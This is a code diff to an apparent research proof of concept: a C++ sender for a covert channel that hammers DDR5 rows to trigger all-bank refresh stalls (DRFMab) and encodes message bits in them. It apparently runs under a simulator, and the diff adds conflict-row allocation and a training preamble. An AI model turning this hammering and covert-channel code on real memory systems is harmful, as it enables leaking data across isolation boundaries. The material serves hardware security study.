@@ -43,6 +43,7 @@
 #include <string>
 #include <limits>
 
+#include "dream_attack.hh"
 #include "rowhammer-addr.hh"
 #include "rowhammer-side.hh"
 
@@ -126,6 +127,24 @@ int main(int argc, char *argv[]) {
     row_ptrs[1] = (char*) mmap_atk(alloc_size, target.to_physical());
     assert(row_ptrs[1] != MAP_FAILED);
 
+    // A conflict row per target bank, so each target access is a real ACT
+    // (see dream_attack.hh).
+    std::vector<char*> conflict_a(DREAM_CONFLICT_ROWS, 0);
+    std::vector<char*> conflict_b(DREAM_CONFLICT_ROWS, 0);
+    for (int d = 0; d < DREAM_CONFLICT_ROWS; d++) {
+        int ra = 20000 + 997 * d;
+        int rb = 30000 + 997 * d;
+        assert(ra != row_a && rb != row_b);
+        target = DDR5_16Gb_x8(NUM_CHANNEL, NUM_RANKS, 0, SENDER_RANK,
+                              SENDER_BG_A, SENDER_BA_A, ra, 0);
+        conflict_a[d] = (char*) mmap_atk(alloc_size, target.to_physical());
+        assert(conflict_a[d] != MAP_FAILED);
+        target = DDR5_16Gb_x8(NUM_CHANNEL, NUM_RANKS, 0, SENDER_RANK,
+                              SENDER_BG_B, SENDER_BA_B, rb, 0);
+        conflict_b[d] = (char*) mmap_atk(alloc_size, target.to_physical());
+        assert(conflict_b[d] != MAP_FAILED);
+    }
+
     std::printf("[DREAM-POC-SEND] Timeout: %d\n", dream_timeout); FLUSH();
 
     // Encode the ASCII string as MSB-first bits.
@@ -143,18 +162,21 @@ int main(int argc, char *argv[]) {
     }
     std::printf("\n"); FLUSH();
 
-    sleep_until(SYNC_POINT);
+    sleep_until(DREAM_SYNC_POINT);
     uint64_t next_window = m5_rpns() + dream_txn_period;
 
     std::printf("[DREAM-POC-SEND] End of first window: %lu\n", next_window);
     FLUSH();
     int min_sleep_assert = std::numeric_limits<int>::max();
-    for (size_t i = 0; i < message.size(); i++) {
-        bool bit = message[i];
-        if (bit) {
+    // The message is preceded by a training preamble (quiet windows, then
+    // windows of 1s) that the receiver uses to set its decision threshold.
+    int total_windows = DREAM_PREAMBLE_WINDOWS + (int) message.size();
+    for (int i = 0; i < total_windows; i++) {
+        if (dream_window_bit(i, message)) {
             // Bit=1: hammer to push the gang counter past T_TH and trigger
             // DRFMab, producing an all-bank stall the receiver can detect.
-            dream_send_random_gang(row_ptrs, dream_timeout);
+            dream_conflict_hammer(row_ptrs[0], row_ptrs[1], conflict_a,
+                                  conflict_b, dream_timeout);
         }
         // Bit=0: idle through window -- no hammering, no DRFMab, receiver
         // sees a quiet window.
